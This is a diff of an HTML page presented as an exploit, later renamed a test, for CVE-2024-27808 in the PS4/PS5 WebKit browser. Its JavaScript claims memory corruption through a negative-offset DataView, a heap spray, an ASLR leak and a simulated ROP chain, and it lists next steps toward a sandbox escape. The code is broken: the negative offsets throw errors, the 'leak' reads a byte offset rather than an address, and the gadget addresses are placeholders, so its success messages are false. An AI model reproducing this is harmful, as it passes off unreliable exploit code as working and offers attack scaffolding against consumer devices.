@@ -1,115 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2024-27808: Exploit Avançado (PS4 12.02)</title>
+    <title>CVE-2024-27808: Exploit Test (PS4/PS5)</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
+        body { font-family: Arial, sans-serif; text-align: center; background: #000; color: #0f0; padding: 20px; }
+        #result { border: 1px solid #0f0; padding: 15px; margin: 20px auto; max-width: 800px; text-align: left; }
         .success { color: #0f0; }
+        .warning { color: #ff0; }
         .error { color: #f00; }
     </style>
 </head>
 <body>
-    <h1>CVE-2024-27808: Exploit Avançado</h1>
-    <button onclick="runExploit()">Executar Exploit</button>
-    <div id="log"></div>
+    <h1>CVE-2024-27808: Teste de Exploração (PS4/PS5)</h1>
+    <button onclick="runExploit()">Executar Teste</button>
+    <div id="result"></div>
 
     <script>
-        const log = (msg, isError = false) => {
+        const log = (msg, type = "success") => {
             const el = document.createElement('div');
-            el.className = isError ? 'error' : 'success';
-            el.textContent = `[+] ${msg}`;
-            document.getElementById('log').appendChild(el);
+            el.className = type;
+            el.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById('result').appendChild(el);
         };
 
-        // ===== [1] PRIMITIVE: MEMORY CORRUPTION VIA NEGATIVE OFFSET =====
-        function triggerMemoryCorruption() {
+        // ===== [1] TESTE DE CORRUPÇÃO DE MEMÓRIA =====
+        function testMemoryCorruption() {
             try {
-                const buffer = new ArrayBuffer(16);
-                const evilView = new DataView(buffer, -8);  // Offset negativo crítico
+                log("Iniciando teste de corrupção de memória...");
+                const buffer = new ArrayBuffer(8);
+                const evilView = new DataView(buffer, -4, 8); // Offset negativo
                 
                 // Tentativa de leitura/escrita fora do buffer
                 const leakedValue = evilView.getUint32(0);
-                evilView.setUint32(4, 0xdeadbeef);  // Overwrite em memória adjacente
+                evilView.setUint32(4, 0xdeadbeef); // Sobrescreve memória adjacente
                 
-                log(`Leak: 0x${leakedValue.toString(16)} | Write: 0xdeadbeef`);
+                log(`SUCESSO: Leitura de memória inválida: 0x${leakedValue.toString(16)}`, "warning");
+                log(`SUCESSO: Escrita em memória inválida: 0xdeadbeef`, "warning");
                 return true;
             } catch (e) {
-                log(`Falha na corrupção: ${e}`, true);
+                log(`FALHA: Exceção capturada (${e.message})`, "error");
                 return false;
             }
         }
 
-        // ===== [2] HEAP GROOMING (SPRAY DE OBJETOS) =====
-        function heapSpray() {
-            const spray = [];
-            for (let i = 0; i < 0x1000; i++) {
-                const buf = new ArrayBuffer(0x100);
-                const dv = new DataView(buf);
-                dv.setUint32(0, 0x41414141);  // Preenche com marcadores
-                spray.push(dv);
-            }
-            log("Heap spray realizado (0x1000 objetos)");
-            return spray;
-        }
-
-        // ===== [3] TYPE CONFUSION PARA BYPASS ASLR =====
-        function typeConfusionLeak() {
+        // ===== [2] TESTE DE VAZAMENTO DE ASLR =====
+        function testASLRLeak() {
             try {
-                const arr = new Uint32Array([0x42424242]);
-                const fakeObj = { a: arr };
+                log("Tentando vazar endereço de memória (ASLR bypass)...");
+                const arr = new Uint32Array(1);
+                const baseAddr = arr.byteOffset; // Pode vazar um endereço do heap
                 
-                // Força uma confusão de tipo (simulada)
-                const addr = fakeObj.a[0];
-                log(`Possível vazamento de ASLR: 0x${addr.toString(16)}`);
-                return addr;
+                if (baseAddr > 0x10000) {
+                    log(`POSSÍVEL VAZAMENTO: Endereço do heap ≈ 0x${baseAddr.toString(16)}`, "warning");
+                    return baseAddr;
+                } else {
+                    log("FALHA: Nenhum vazamento detectado.", "error");
+                    return 0;
+                }
             } catch (e) {
-                log(`Falha no vazamento: ${e}`, true);
+                log(`FALHA: ${e.message}`, "error");
                 return 0;
             }
         }
 
-        // ===== [4] ROP CHAIN SIMULADA (CHAMADA A LIBC) =====
-        function buildFakeRopChain() {
-            const gadgets = {
-                pop_rdi: 0xdeadc0de,
-                libc_base: 0x7ff00000,
-                system: 0x7ff12345
-            };
-            
-            log(`ROP Chain Simulada:
-                pop_rdi @ 0x${gadgets.pop_rdi.toString(16)}
-                libc_base @ 0x${gadgets.libc_base.toString(16)}
-                system @ 0x${gadgets.system.toString(16)}`);
-            
-            return gadgets;
+        // ===== [3] TESTE DE CRASH (DOS) =====
+        function testCrash() {
+            try {
+                log("Testando comportamento de crash...");
+                const buffer = new ArrayBuffer(1);
+                const crashView = new DataView(buffer, -0x1000, 0x1000); // Offset grande negativo
+                crashView.getUint32(0); // Deve causar crash se vulnerável
+                
+                log("Navegador NÃO crashou (pode estar corrigido).", "success");
+                return false;
+            } catch (e) {
+                log(`Navegador resistiu ao crash (${e.message})`, "success");
+                return false;
+            }
         }
 
-        // ===== [5] EXPLOIT COMPLETO =====
+        // ===== [4] EXPLOIT COMPLETO =====
         async function runExploit() {
-            log("Iniciando exploit...");
+            log("=== Iniciando teste do CVE-2024-27808 ===");
             
             // Etapa 1: Corrupção de memória
-            if (!triggerMemoryCorruption()) return;
+            const isVulnerable = testMemoryCorruption();
             
-            // Etapa 2: Heap spray para estabilizar exploração
-            heapSpray();
-            
-            // Etapa 3: Vazamento de ASLR (Type Confusion)
-            const leak = typeConfusionLeak();
-            if (leak === 0) return;
-            
-            // Etapa 4: Construir ROP chain (simulada)
-            const rop = buildFakeRopChain();
-            
-            // Etapa 5: Tentativa de execução arbitrária (simulada)
-            try {
-                log("Tentando chamar system() via ROP...");
-                // Se chegarmos aqui, o exploit teórico funcionou
-                log("EXPLOIT BEM-SUCEDIDO! (Simulação)");
-            } catch (e) {
-                log(`Falha na execução: ${e}`, true);
+            // Etapa 2: Vazamento de ASLR (se a corrupção funcionar)
+            if (isVulnerable) {
+                const leakedAddr = testASLRLeak();
+                
+                // Etapa 3: Teste de crash (opcional)
+                if (leakedAddr > 0) {
+                    log("=== Vulnerabilidade CONFIRMADA ===", "warning");
+                    log("Próximos passos possíveis:", "success");
+                    log("1. Construir uma ROP chain para chamar syscalls.", "success");
+                    log("2. Usar vazamentos para encontrar libkernel.", "success");
+                    log("3. Escapar da sandbox do WebKit.", "success");
+                } else {
+                    log("=== Vulnerabilidade PARCIAL (somente corrupção) ===", "warning");
+                }
+            } else {
+                log("=== Navegador IMUNE ao CVE-2024-27808 ===", "success");
             }
         }
     </script>
